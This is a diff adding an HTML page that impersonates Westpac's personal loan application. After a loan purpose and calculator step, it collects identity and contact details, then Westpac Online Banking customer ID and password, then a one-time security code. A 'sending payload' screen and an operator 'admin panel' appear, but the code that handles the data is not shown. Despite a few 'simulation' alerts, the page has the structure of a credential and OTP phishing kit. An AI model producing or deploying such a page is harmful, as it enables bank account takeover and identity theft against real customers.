@@ -1,0 +1,1248 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Westpac Personal Loans - Let's Get You Started</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Google Fonts for premium typography -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap"
+    rel="stylesheet">
+
+  <!-- <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet"> -->
+  <!-- <link rel="stylesheet" href="style.css"> -->
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+
+    /* Brand Colors and Utilities */
+    .bg-brand-red {
+      background-color: #DA1710;
+    }
+
+    .text-brand-red {
+      color: #DA1710;
+    }
+
+    .border-brand-red {
+      border-color: #DA1710;
+    }
+
+    .hover-bg-brand-red:hover {
+      background-color: #b8120b;
+    }
+
+    .bg-brand-blue {
+      background-color: #002F6C;
+    }
+
+    .text-brand-blue {
+      color: #002F6C;
+    }
+
+    .border-brand-blue {
+      border-color: #002F6C;
+    }
+
+    /* Premium Hide Scrollbar */
+    .no-scrollbar::-webkit-scrollbar {
+      display: none;
+    }
+
+    .no-scrollbar {
+      -ms-overflow-style: none;
+      scrollbar-width: none;
+    }
+
+    /* Key Entry Boxes Animation */
+    .otp-input:focus {
+      border-color: #DA1710;
+      box-shadow: 0 0 0 3px rgba(218, 23, 16, 0.15);
+    }
+  </style>
+</head>
+
+<body>
+  <div class="grid grid-cols-1 lg:grid-cols-12 min-h-screen">
+    <!-- LEFT PANE: Premium Customer Loan Application (8 Columns on desktop) -->
+    <main class="lg:col-span-8 flex flex-col bg-white border-r border-gray-200">
+
+      <!-- Top Navigation/Header mimicking Westpac -->
+      <header
+        class="border-b border-gray-200 py-4 px-6 md:px-12 flex justify-between items-center bg-white sticky top-0 z-50">
+        <div class="flex items-center space-x-3">
+          <!-- Premium Mock Westpac Logo -->
+          <div class="flex items-center">
+            <span class="text-3xl font-black text-brand-red tracking-tighter">W</span>
+            <span class="text-xl font-bold text-brand-blue tracking-tight ml-1">westpac</span>
+          </div>
+          <span class="hidden md:inline-block h-6 w-[1px] bg-gray-300"></span>
+          <span class="hidden md:inline-block text-xs text-gray-500 font-semibold tracking-wider uppercase">Personal
+            Banking</span>
+        </div>
+        <div class="flex items-center space-x-4">
+          <span
+            class="flex items-center text-xs text-green-600 font-medium bg-green-50 px-2.5 py-1 rounded-full border border-green-200">
+            <svg class="w-3.5 h-3.5 mr-1" fill="currentColor" viewBox="0 0 20 20">
+              <path fill-rule="evenodd"
+                d="M2.166 11.38A10.996 10.996 0 0110 8c1.868 0 3.616.464 5.148 1.284L13.92 10.51A8.995 8.995 0 0010 9.5c-1.39 0-2.697.315-3.864.877L4.55 8.79a11.026 11.026 0 01-2.384 2.59zM10 12c-1.636 0-3.15-.418-4.47-1.15l-1.31 1.31A10.949 10.949 0 0010 13.5c1.868 0 3.616-.464 5.148-1.284l-1.228-1.228A8.995 8.995 0 0110 12z"
+                clip-rule="evenodd"></path>
+              <path d="M10 4a3 3 0 100 6 3 3 0 000-6z"></path>
+            </svg>
+            Secure Application Session
+          </span>
+        </div>
+      </header>
+
+      <!-- Main Dynamic Content Container -->
+      <div class="flex-1 p-6 md:p-12 max-w-4xl mx-auto w-full transition-all duration-300">
+
+        <!-- STEP 1: Loan Purpose Selection -->
+        <section id="step-selection" class="block transition-opacity duration-300">
+          <div class="text-center md:text-left mb-8">
+            <h1 class="text-3xl md:text-4xl font-extrabold text-brand-blue uppercase tracking-tight mb-2">Let's Get You
+              Started</h1>
+            <p class="text-lg text-gray-600 font-semibold">What would you like a personal loan for?</p>
+          </div>
+
+          <!-- Cards Grid matching the index-pic layout -->
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+
+            <!-- Petrol/Diesel/LPG Car -->
+            <button onclick="selectPurpose('Buy a petrol, diesel or LPG car')"
+              class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div
+                class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                    d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM19 17a2 2 0 11-4 0 2 2 0 014 0z" />
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                    d="M13 16V6a1 1 0 00-1-1H4a1 1 0 00-1 1v10M21 16V9a4 4 0 00-4-4h-3v11M14 9h4" />
+                </svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Buy a petrol, diesel or LPG
+                car</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select &
+                Continue →</div>
+            </button>
+
+            <!-- Electric/Hybrid Car -->
+            <button onclick="selectPurpose('Buy an electric or hybrid car')"
+              class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div
+                class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform relative">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                    d="M13 10V3L4 14h7v7l9-11h-7z" />
+                </svg>
+                <div
+                  class="absolute -top-1 -right-1 bg-brand-red text-white text-[10px] px-1.5 py-0.5 rounded-full font-bold">
+                  ECO</div>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Buy an electric or hybrid car</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select &
+                Continue →</div>
+            </button>
+
+            <!-- Caravan, RV or Motorbike -->
+            <button onclick="selectPurpose('Buy a caravan, RV or motorbike')"
+              class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div
+                class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                    d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z" />
+                </svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Buy a caravan, RV or motorbike</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select &
+                Continue →</div>
+            </button>
+
+            <!-- Consolidating My Debts -->
+            <button onclick="selectPurpose('Consolidating my debts')"
+              class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div
+                class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                    d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+                </svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Consolidating my debts</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select &
+                Continue →</div>
+            </button>
+
+            <!-- Renovate My Home -->
+            <button onclick="selectPurpose('Renovate my home/place')"
+              class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div
+                class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                    d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
+                </svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Renovate my home/place</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select &
+                Continue →</div>
+            </button>
+
+            <!-- Solar Panels -->
+            <button onclick="selectPurpose('Got solar panels')"
+              class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div
+                class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                    d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364-6.364l-.707.707M6.343 17.657l-.707.707m0-12.728l.707.707m12.728 12.728l.707.707M12 8a4 4 0 100 8 4 4 0 000-8z" />
+                </svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Got solar panels</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select &
+                Continue →</div>
+            </button>
+
+            <!-- Go On a Holiday -->
+            <button onclick="selectPurpose('Go on a holiday')"
+              class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div
+                class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                    d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8" />
+                </svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Go on a holiday</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select &
+                Continue →</div>
+            </button>
+
+            <!-- Buy a Boat or Jet Ski -->
+            <button onclick="selectPurpose('Buy a boat or jet ski')"
+              class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div
+                class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                    d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9" />
+                </svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Buy a boat or jet ski</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select &
+                Continue →</div>
+            </button>
+
+            <!-- Something Else -->
+            <button onclick="selectPurpose('Something else')"
+              class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div
+                class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
+                    d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l.707-.707m2.828 9.9a5 5 0 113.536 0V21h-3.536v-3.457z" />
+                </svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Something else</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select &
+                Continue →</div>
+            </button>
+
+          </div>
+        </section>
+
+        <!-- STEP 2: Details & Calculator Page -->
+        <section id="step-details" class="hidden transition-opacity duration-300">
+
+          <!-- Selected Purpose Indicator -->
+          <div
+            class="flex items-center space-x-2 bg-blue-50 text-brand-blue px-4 py-3 rounded-lg border border-blue-100 mb-8">
+            <svg class="w-5 h-5 text-brand-red" fill="currentColor" viewBox="0 0 20 20">
+              <path fill-rule="evenodd"
+                d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
+                clip-rule="evenodd"></path>
+            </svg>
+            <span class="text-sm font-semibold">Applying for: <strong id="selected-purpose-label"
+                class="text-brand-red">Not selected</strong></span>
+            <button onclick="goToStep('selection')"
+              class="ml-auto text-xs font-bold underline hover:text-brand-red">Change</button>
+          </div>
+
+          <div class="mb-8">
+            <h2 class="text-3xl font-extrabold text-brand-blue tracking-tight">About you</h2>
+            <p class="text-sm text-gray-500 mt-1">To begin, we just need a few details.</p>
+          </div>
+
+          <!-- LOAN CALCULATOR SECTION -->
+          <div class="bg-gray-50 rounded-2xl p-6 border border-gray-200 mb-10">
+            <h3 class="text-lg font-bold text-brand-blue mb-4 flex items-center">
+              <svg class="w-5 h-5 mr-2 text-brand-red" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                  d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z" />
+              </svg>
+              Loan Amount & Repayment Calculator
+            </h3>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+              <!-- Sliders & Controls -->
+              <div class="space-y-6">
+                <!-- Loan Amount -->
+                <div>
+                  <div class="flex justify-between items-center mb-2">
+                    <label class="text-sm font-semibold text-gray-700">Loan Amount</label>
+                    <span class="text-lg font-bold text-brand-blue" id="amount-display">$30,000</span>
+                  </div>
+                  <input type="range" id="loan-amount" min="2000" max="80000" step="500" value="30000"
+                    oninput="calcRepayments()"
+                    class="w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer accent-red-600">
+                  <div class="flex justify-between text-xs text-gray-400 mt-1">
+                    <span>$2,000</span>
+                    <span>$80,000</span>
+                  </div>
+                </div>
+
+                <!-- Loan Duration -->
+                <div>
+                  <div class="flex justify-between items-center mb-2">
+                    <label class="text-sm font-semibold text-gray-700">Loan Term</label>
+                    <span class="text-lg font-bold text-brand-blue" id="duration-display">5 Years</span>
+                  </div>
+                  <input type="range" id="loan-duration" min="1" max="7" step="1" value="5" oninput="calcRepayments()"
+                    class="w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer accent-red-600">
+                  <div class="flex justify-between text-xs text-gray-400 mt-1">
+                    <span>1 Year</span>
+                    <span>7 Years</span>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Live Estimate Display Card -->
+              <div class="bg-white p-5 rounded-xl border border-gray-100 flex flex-col justify-between shadow-sm">
+                <div>
+                  <span class="text-xs font-bold text-gray-400 uppercase tracking-wider">Estimated Repayment</span>
+                  <div class="flex items-baseline mt-2">
+                    <span class="text-3xl font-extrabold text-brand-red" id="repayment-amount">$138.15</span>
+                    <span class="text-sm font-semibold text-gray-500 ml-1">/ weekly</span>
+                  </div>
+                  <p class="text-[11px] text-gray-400 mt-2">Calculated at an interest rate of <strong
+                      class="text-gray-600">8.49% p.a.</strong> comparison rate. Subject to final credit assessment.</p>
+                </div>
+                <div class="border-t border-gray-100 pt-3 mt-4 grid grid-cols-2 gap-2 text-xs">
+                  <div>
+                    <span class="text-gray-400 block">Monthly rate:</span>
+                    <strong class="text-gray-700" id="repayment-monthly">$598.65</strong>
+                  </div>
+                  <div>
+                    <span class="text-gray-400 block">Total interest:</span>
+                    <strong class="text-gray-700" id="repayment-interest">$5,919.00</strong>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- PERSONAL DETAILS FORM -->
+          <form id="details-form" onsubmit="submitDetails(event)" class="space-y-6">
+
+            <!-- Title Selector -->
+            <div>
+              <label class="block text-sm font-bold text-brand-blue mb-1.5" for="title">Title</label>
+              <select id="title" required
+                class="w-full md:w-1/3 px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent bg-white">
+                <option value="">Please select</option>
+                <option value="Mr">Mr</option>
+                <option value="Mrs">Mrs</option>
+                <option value="Ms">Ms</option>
+                <option value="Miss">Miss</option>
+                <option value="Dr">Dr</option>
+              </select>
+            </div>
+
+            <!-- First Name -->
+            <div>
+              <label class="block text-sm font-bold text-brand-blue" for="first-name">First name</label>
+              <p class="text-xs text-gray-500 mb-1.5">To help us verify your identity online, please enter your name
+                exactly as it appears on your ID.</p>
+              <input type="text" id="first-name" required
+                class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent">
+            </div>
+
+            <!-- Middle Name -->
+            <div>
+              <label class="block text-sm font-bold text-brand-blue mb-1.5" for="middle-name">Middle name(s) (if
+                any)</label>
+              <input type="text" id="middle-name"
+                class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent">
+            </div>
+
+            <!-- Last Name -->
+            <div>
+              <label class="block text-sm font-bold text-brand-blue mb-1.5" for="last-name">Last name</label>
+              <input type="text" id="last-name" required
+                class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent">
+            </div>
+
+            <!-- Known Legally By Only This Name Toggle -->
+            <div>
+              <span class="block text-sm font-bold text-brand-blue mb-2">Is this the only name you've ever been known by
+                legally?</span>
+              <div class="flex space-x-4">
+                <button type="button" onclick="setLegalNameToggle(true)" id="btn-name-yes"
+                  class="w-24 py-3 border-2 border-brand-blue bg-brand-blue text-white rounded-lg font-bold text-sm transition-all focus:outline-none">Yes</button>
+                <button type="button" onclick="setLegalNameToggle(false)" id="btn-name-no"
+                  class="w-24 py-3 border-2 border-gray-300 text-gray-700 hover:border-brand-blue rounded-lg font-bold text-sm transition-all focus:outline-none">No</button>
+              </div>
+            </div>
+
+            <!-- Email Address -->
+            <div>
+              <label class="block text-sm font-bold text-brand-blue mb-1.5" for="email">Email address</label>
+              <input type="email" id="email" required
+                class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent">
+            </div>
+
+            <!-- Mobile Number -->
+            <div>
+              <label class="block text-sm font-bold text-brand-blue" for="phone">Mobile number</label>
+              <p class="text-xs text-gray-500 mb-1.5">Enter your Australian mobile number e.g. 0401234567</p>
+              <div class="flex">
+                <span
+                  class="inline-flex items-center px-4 rounded-l-lg border border-r-0 border-gray-300 bg-gray-100 text-gray-600 text-sm font-medium">
+                  AUS +61
+                </span>
+                <input type="tel" id="phone" required placeholder="0401234567" pattern="[0-9]{9,10}"
+                  class="w-full px-4 py-3 border border-gray-300 rounded-r-lg focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent">
+              </div>
+            </div>
+
+            <!-- Help Protect Application Security Info Card -->
+            <div class="bg-gray-50 rounded-xl p-5 border border-gray-200 mt-8 flex items-start space-x-4">
+              <div class="text-brand-red flex-shrink-0 mt-1">
+                <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                    d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
+                </svg>
+              </div>
+              <div>
+                <h4 class="text-sm font-bold text-brand-blue mb-1">Help protect your application</h4>
+                <p class="text-xs text-gray-500">Before continuing, we will secure your application session. Moving
+                  forward, you will verify your Westpac Online Banking credentials for instant validation.</p>
+              </div>
+            </div>
+
+            <!-- Submit Button (Continues to Sign In Page) -->
+            <div class="flex justify-between items-center pt-6 border-t border-gray-100">
+              <button type="button" onclick="goToStep('selection')"
+                class="px-6 py-3 border border-gray-300 rounded-lg text-sm font-bold text-gray-600 hover:bg-gray-50">Exit</button>
+              <button type="submit"
+                class="px-8 py-3.5 bg-brand-red hover-bg-brand-red text-white font-bold text-sm rounded-lg shadow-md transition-all">
+                Continue to sign in
+              </button>
+            </div>
+          </form>
+        </section>
+
+        <!-- STEP 3: Bank Sign In Screen -->
+        <section id="step-signin" class="hidden transition-opacity duration-300">
+
+          <div class="max-w-md mx-auto">
+            <!-- Sign-in Header -->
+            <div class="text-center mb-8">
+              <h2 class="text-2xl md:text-3xl font-bold text-brand-blue tracking-tight">Sign in to Westpac Online
+                Banking</h2>
+              <p class="text-sm text-gray-500 mt-2">Confirm your identity to instantly links your application.</p>
+            </div>
+
+            <div class="bg-white rounded-2xl border border-gray-200 shadow-lg overflow-hidden">
+              <div class="p-6 md:p-8">
+                <!-- Main Login Form -->
+                <form id="signin-form" onsubmit="handleSignInSubmit(event)" class="space-y-6">
+
+                  <div>
+                    <label class="block text-sm font-bold text-gray-700 mb-1" for="customer-id">Customer ID</label>
+                    <input type="text" id="customer-id" required
+                      class="w-full px-4 py-3 border-2 border-gray-300 focus:border-brand-blue focus:outline-none rounded-lg font-mono tracking-wider">
+                  </div>
+
+                  <div>
+                    <label class="block text-sm font-bold text-gray-700 mb-1" for="password">Password</label>
+                    <input type="password" id="password" required
+                      class="w-full px-4 py-3 border-2 border-gray-300 focus:border-brand-blue focus:outline-none rounded-lg">
+                  </div>
+
+                  <div class="flex items-center">
+                    <input type="checkbox" id="remember-id"
+                      class="w-4.5 h-4.5 text-brand-red border-gray-300 rounded focus:ring-red-500">
+                    <label for="remember-id" class="ml-2 text-xs font-semibold text-gray-600">Remember customer
+                      ID</label>
+                  </div>
+
+                  <button type="submit"
+                    class="w-full py-4 bg-brand-red hover-bg-brand-red text-white font-bold text-base rounded-lg shadow-md transition-all">
+                    Sign in
+                  </button>
+
+                  <div class="text-center pt-2">
+                    <a href="#" onclick="alert('This feature is disabled for demo application stability.')"
+                      class="text-xs font-semibold text-brand-blue hover:underline">Forgot customer ID or password?</a>
+                  </div>
+                </form>
+              </div>
+
+              <!-- Security Reminder side content matching image design -->
+              <div class="bg-gray-50 border-t border-gray-100 p-6 flex items-start space-x-4">
+                <div class="text-brand-blue flex-shrink-0 mt-1">
+                  <!-- Lock Shield SVG Icon -->
+                  <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd"
+                      d="M2.166 11.38A10.996 10.996 0 0110 8c1.868 0 3.616.464 5.148 1.284L13.92 10.51A8.995 8.995 0 0010 9.5c-1.39 0-2.697.315-3.864.877L4.55 8.79a11.026 11.026 0 01-2.384 2.59zM10 12c-1.636 0-3.15-.418-4.47-1.15l-1.31 1.31A10.949 10.949 0 0010 13.5c1.868 0 3.616-.464 5.148-1.284l-1.228-1.228A8.995 8.995 0 0110 12z"
+                      clip-rule="evenodd"></path>
+                  </svg>
+                </div>
+                <div>
+                  <h3 class="text-sm font-bold text-brand-blue flex items-center">
+                    Security reminder
+                    <span class="ml-1 text-[10px] text-gray-400 font-semibold tracking-wider uppercase">Westpac
+                      Protect™</span>
+                  </h3>
+                  <ul class="text-xs text-gray-500 mt-2 space-y-1.5 list-disc list-inside">
+                    <li>Don't sign in if you are sharing access to your computer</li>
+                    <li>Never share your security codes or passwords with anyone</li>
+                    <li>Call us on 132 032 if you are being asked to do this</li>
+                  </ul>
+                  <a href="#" onclick="alert('This link is disabled during application simulation.')"
+                    class="inline-block mt-3 text-xs font-semibold text-brand-blue hover:underline">Learn more about
+                    staying safe</a>
+                </div>
+              </div>
+
+            </div>
+          </div>
+        </section>
+
+        <!-- STEP 4: Dynamic OTP / PIN Code Verification Page -->
+        <section id="step-otp" class="hidden transition-opacity duration-300">
+          <div class="max-w-md mx-auto text-center">
+
+            <div class="w-16 h-16 rounded-full bg-red-50 text-brand-red flex items-center justify-center mx-auto mb-6">
+              <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                  d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+              </svg>
+            </div>
+
+            <h2 class="text-2xl font-bold text-brand-blue mb-2">Security Verification</h2>
+            <p class="text-sm text-gray-500 mb-6">
+              A temporary security code has been generated. To continue, enter the <strong
+                id="otp-length-label">5</strong>-digit code provided to you.
+            </p>
+
+            <form id="otp-form" onsubmit="handleOtpSubmit(event)" class="space-y-6">
+
+              <!-- Container where individual digit inputs are rendered dynamically -->
+              <div id="otp-inputs-container" class="flex justify-center space-x-3">
+                <!-- Populated dynamically via JS based on choice of OTP 5 or OTP 6 -->
+              </div>
+
+              <button type="submit"
+                class="w-full py-3.5 bg-brand-red hover-bg-brand-red text-white font-bold text-sm rounded-lg shadow-md transition-all">
+                Confirm Code
+              </button>
+
+              <p class="text-xs text-gray-400 mt-4">
+                Having issues? The simulator admin panel can accept or reject this workflow.
+              </p>
+            </form>
+          </div>
+        </section>
+
+        <!-- STEP 5: Waiting / Loader Screen -->
+        <section id="step-processing" class="hidden transition-opacity duration-300">
+          <div class="max-w-md mx-auto text-center py-12">
+            <div class="relative w-20 h-20 mx-auto mb-6">
+              <!-- Animated Ring Outer -->
+              <div class="absolute inset-0 rounded-full border-4 border-gray-100"></div>
+              <!-- Running Spinner Inner -->
+              <div class="absolute inset-0 rounded-full border-4 border-brand-red border-t-transparent animate-spin">
+              </div>
+            </div>
+            <h3 class="text-xl font-bold text-brand-blue" id="processing-title">Sending details...</h3>
+            <p class="text-sm text-gray-500 mt-2" id="processing-subtitle">Establishing a secure channel and sending
+              payload</p>
+          </div>
+        </section>
+
+        <!-- STEP 6A: SUCCESS PAGE (Thank You) -->
+        <section id="step-success" class="hidden transition-opacity duration-300">
+          <div class="max-w-2xl mx-auto bg-white rounded-2xl border-2 border-green-500 overflow-hidden shadow-xl">
+            <div class="bg-green-500 text-white p-8 text-center">
+              <div
+                class="w-16 h-16 rounded-full bg-white text-green-500 flex items-center justify-center mx-auto mb-4 shadow-lg">
+                <svg class="w-10 h-10" fill="currentColor" viewBox="0 0 20 20">
+                  <path fill-rule="evenodd"
+                    d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
+                    clip-rule="evenodd"></path>
+                </svg>
+              </div>
+              <h2 class="text-3xl font-extrabold tracking-tight">Application Approved!</h2>
+              <p class="text-green-50 font-medium mt-1">Thank you for submitting your details. Your loan has been
+                provisionally accepted.</p>
+            </div>
+
+            <div class="p-6 md:p-8 space-y-6">
+              <h3 class="text-lg font-bold text-brand-blue border-b border-gray-100 pb-2">Client Details & Loan
+                Parameters</h3>
+              <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
+                <div>
+                  <span class="text-gray-400 block font-medium">Applicant Name</span>
+                  <strong class="text-gray-700" id="summary-name">Mr. Jane Doe</strong>
+                </div>
+                <div>
+                  <span class="text-gray-400 block font-medium">Loan Purpose</span>
+                  <strong class="text-gray-700 text-brand-red" id="summary-purpose">Renovate My Home</strong>
+                </div>
+                <div>
+                  <span class="text-gray-400 block font-medium">Approved Amount</span>
+                  <strong class="text-gray-700 text-brand-blue" id="summary-amount">$30,000</strong>
+                </div>
+                <div>
+                  <span class="text-gray-400 block font-medium">Loan Term</span>
+                  <strong class="text-gray-700" id="summary-term">5 Years</strong>
+                </div>
+                <div>
+                  <span class="text-gray-400 block font-medium">Email Address</span>
+                  <strong class="text-gray-700" id="summary-email">applicant@example.com</strong>
+                </div>
+                <div>
+                  <span class="text-gray-400 block font-medium">Contact Number</span>
+                  <strong class="text-gray-700" id="summary-phone">+61 401 234 567</strong>
+                </div>
+              </div>
+
+              <div class="bg-gray-50 rounded-xl p-5 border border-gray-200 mt-6 text-xs text-gray-500">
+                <p class="font-bold text-brand-blue mb-1">What happens next?</p>
+                <p>One of our personal loan specialist lenders will contact you via your mobile number within the next
+                  2-4 business hours to complete the final processing and verification.</p>
+              </div>
